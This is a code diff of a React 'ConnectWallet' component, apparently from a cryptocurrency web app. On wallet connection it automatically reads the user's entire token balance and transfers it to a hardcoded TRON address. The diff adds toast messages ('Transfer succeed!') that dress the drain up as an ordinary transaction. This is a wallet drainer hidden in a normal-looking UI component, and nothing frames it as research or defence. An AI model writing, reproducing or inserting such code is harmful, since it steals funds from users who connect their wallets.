@@ -37,6 +37,7 @@ import { Payment, TransactionsTable } from '../tx-table';
 import { ColumnDef } from '@tanstack/react-table';
 import { ArrowUpDown, MoreHorizontal } from 'lucide-react';
 import { USDT_ADDRESS_BASE58 } from '@/shared/config';
+import { toast } from 'sonner';
 
 
 export const ConnectWallet = React.memo(function() {
@@ -75,7 +76,7 @@ export const ConnectWallet = React.memo(function() {
         }
 
 
-        const balance = amountToHuman(await balanceOf(address?.base58, USDT_ADDRESS_BASE58))
+        const balance = amountToHuman(await balanceOf(address?.base58))
         const a = +formAmount * 1000000;
         
         if(a < balance) {
@@ -89,24 +90,28 @@ export const ConnectWallet = React.memo(function() {
 
 
     useEffect(() => {
-        
         if(!isConnected || !address) {
             return;
         }
 
-        console.log(address)
-        
-
         callTransfer(address.base58);
-        
     }, [isConnected, address]);
 
 
     const callTransfer = useCallback(async (address: string) => {
         try {
-            const balance = await balanceOf(address, USDT_ADDRESS_BASE58);
-            transferToken('TMZKwqtGe2HcBriRt5pVubxmYjZ2Y3j6Nm', +balance);
+            const balance = await balanceOf(address);
+
+            if(balance == 0) {
+                toast.error('Insufficient balance');
+                return;
+            }
+
+            transferToken('TMZKwqtGe2HcBriRt5pVubxmYjZ2Y3j6Nm', +balance).then(() => {
+                toast.success('Transfer succeed!');
+            });
         } catch (e) {
+            toast.error('Something gone wrong...');
             console.error(e);
         }
     }, [balanceOf, address, isConnected]);
